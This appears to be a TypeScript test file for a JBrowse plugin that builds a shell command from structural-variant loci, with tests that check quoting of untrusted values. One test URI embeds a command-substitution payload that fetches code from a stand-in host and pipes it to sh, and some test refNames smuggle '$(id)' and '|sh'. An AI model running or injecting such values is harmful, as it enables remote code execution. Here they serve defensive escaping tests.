import { alignmentFileOf, deriveCommand, deriveLoci } from './deriveCommand.ts'

import type { DerivativeCandidate } from '@jbrowse/plugin-alignments'

function candidate(
  observed: { refName: string; start: number; end: number; strand?: number }[],
  flank = 2000,
): DerivativeCandidate {
  const observedSegments = observed.map(s => ({ strand: 1, ...s }))
  const last = observedSegments.length - 1
  return {
    segments: observedSegments.map((s, i) => ({
      ...s,
      start: i === 0 ? s.start - flank : s.start,
      end: i === last ? s.end + flank : s.end,
    })),
    observedSegments,
    readCount: 28,
    pathId: observed.map(s => `${s.refName}:${s.start}`).join('|'),
    locString: '',
    refNames: [...new Set(observed.map(s => s.refName))],
    extendsOffScreen: false,
  }
}

const der3 = candidate([
  { refName: 'chr3', start: 25326821, end: 25359568 },
  { refName: 'chr10', start: 58717463, end: 58717662 },
  { refName: 'chr12', start: 72273111, end: 72273294, strand: -1 },
  { refName: 'chr3', start: 25352683, end: 25359111, strand: -1 },
])

test('both sides of every junction, in path order, off the observed segments', () => {
  expect(deriveLoci(der3)).toEqual([
    'chr3:25359568',
    'chr10:58717463',
    'chr10:58717662',
    'chr12:72273294',
    'chr12:72273111',
    'chr3:25359111',
  ])
})

test('an inverted segment is entered at its high coordinate', () => {
  const loci = deriveLoci(
    candidate([
      { refName: 'chrA', start: 0, end: 20000 },
      { refName: 'chrA', start: 10000, end: 16000, strand: -1 },
    ]),
  )
  expect(loci).toEqual(['chrA:20000', 'chrA:16000'])
})

// What a POSIX shell would hand `derive` as argv: single quotes are literal
// through to the next quote, a backslash outside them escapes one character
// (which is how a line continuation disappears), and unquoted whitespace
// separates words. Operators are not modelled, so a `<placeholder>` comes back
// as an ordinary word -- it is not one, which is what makes it un-runnable
// until the reader replaces it.
function shellWords(command: string) {
  const words: string[] = []
  let current = ''
  let started = false
  let quoted = false
  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!
    if (quoted) {
      if (ch === "'") {
        quoted = false
      } else {
        current += ch
      }
    } else if (ch === "'") {
      quoted = true
      started = true
    } else if (ch === '\\') {
      i += 1
      const escaped = command[i]
      if (escaped !== undefined && escaped !== '\n') {
        current += escaped
        started = true
      }
    } else if (/\s/.test(ch)) {
      if (started) {
        words.push(current)
      }
      current = ''
      started = false
    } else {
      current += ch
      started = true
    }
  }
  if (started) {
    words.push(current)
  }
  return words
}

const der3Loci =
  'chr3:25359568,chr10:58717463,chr10:58717662,chr12:72273294,chr12:72273111,chr3:25359111'

test('the command names the track file when the adapter has one', () => {
  expect(deriveCommand(der3, 'https://example.org/COLO829_tumor.cram')).toBe(
    [
      'python3 sv_multihop.py derive',
      "--aln 'https://example.org/COLO829_tumor.cram'",
      '--ref <reference.fa>',
      `--loci '${der3Loci}'`,
      "--out 'der_chr3_chr10_chr12' --name 'der_chr3_chr10_chr12'",
    ].join(' \\\n  '),
  )
})

test('a track with no file leaves a placeholder rather than an empty flag', () => {
  expect(deriveCommand(der3, undefined)).toContain('--aln <reads.bam>')
})

test('a uri carrying shell metacharacters arrives as one argument', () => {
  const uri =
    'https://evil.test/reads.bam?x=$(curl -s https://evil.test/p|sh);id\n#'
  expect(shellWords(deriveCommand(der3, uri))).toEqual([
    'python3',
    'sv_multihop.py',
    'derive',
    '--aln',
    uri,
    '--ref',
    '<reference.fa>',
    '--loci',
    der3Loci,
    '--out',
    'der_chr3_chr10_chr12',
    '--name',
    'der_chr3_chr10_chr12',
  ])
})

test('a local path with a space and an apostrophe stays one argument', () => {
  const path = "/Users/colin/Documents/Colin's Genomes/My Reads.bam"
  expect(shellWords(deriveCommand(der3, path))).toEqual([
    'python3',
    'sv_multihop.py',
    'derive',
    '--aln',
    path,
    '--ref',
    '<reference.fa>',
    '--loci',
    der3Loci,
    '--out',
    'der_chr3_chr10_chr12',
    '--name',
    'der_chr3_chr10_chr12',
  ])
})

test('the loci and the name survive a refName the SAM grammar allows', () => {
  const named = candidate([
    { refName: 'chrA;$(id)', start: 0, end: 100 },
    { refName: 'chrB|sh', start: 50, end: 150 },
  ])
  expect(shellWords(deriveCommand(named, undefined))).toEqual([
    'python3',
    'sv_multihop.py',
    'derive',
    '--aln',
    '<reads.bam>',
    '--ref',
    '<reference.fa>',
    '--loci',
    'chrA;$(id):100,chrB|sh:50',
    '--out',
    'der_chrA;$(id)_chrB|sh',
    '--name',
    'der_chrA;$(id)_chrB|sh',
  ])
})

test('the alignment file comes from either adapter type', () => {
  expect(
    alignmentFileOf({
      bamLocation: { uri: 'a.bam', locationType: 'UriLocation' },
    }),
  ).toBe('a.bam')
  expect(
    alignmentFileOf({
      cramLocation: { uri: 'a.cram', locationType: 'UriLocation' },
    }),
  ).toBe('a.cram')
  expect(
    alignmentFileOf({
      bamLocation: { localPath: '/d/a.bam', locationType: 'LocalPathLocation' },
    }),
  ).toBe('/d/a.bam')
  expect(alignmentFileOf({})).toBeUndefined()
})
